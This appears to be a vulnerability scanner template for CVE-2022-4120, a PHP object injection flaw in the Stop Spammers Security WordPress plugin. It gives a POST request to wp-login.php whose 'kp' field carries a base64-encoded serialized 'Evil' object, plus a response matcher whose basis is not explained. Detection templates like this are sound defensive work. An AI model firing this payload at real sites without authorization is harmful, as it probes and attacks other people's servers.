id: CVE-2022-4120

info:
  name: Unauthenticated PHP Object Injection in Stop Spammers Security Plugin
  author: ProjectDiscoveryAI
  severity: critical
  description: The Stop Spammers Security WordPress plugin before 2022.6 is vulnerable to PHP Object injection via base64 encoded user input passed to the unserialize() function when CAPTCHA is used as a second challenge.
  impact: |
    Remote attackers can execute arbitrary code on the server
  remediation: |
    Update Stop Spammers Security Plugin to the latest version
  reference:
    - https://wpscan.com/vulnerability/e8bb79db-ef77-43be-b449-4c4b5310eedf
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-4120
    epss-score: 0.00283
    epss-percentile: 0.69395
    cpe: cpe:2.3:a:trumani:stop_spammers:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: trumani
    product: stop_spammers
    framework: wordpress
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-login.php"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      kn=6dc52e6b54&ss_block=G&kp=Tzo0OiJFdmlsIjowOnt9Ow%3D%3D&kr=Allow+List+Email%3A+block%40email.com&ka=block%40email.com&ke=cwenf&km=cc&recaptcha=recaptcha&g-recaptcha-response=
    matchers:
      - type: word
        words:
          - "Arbitrary deserialization"
        part: body
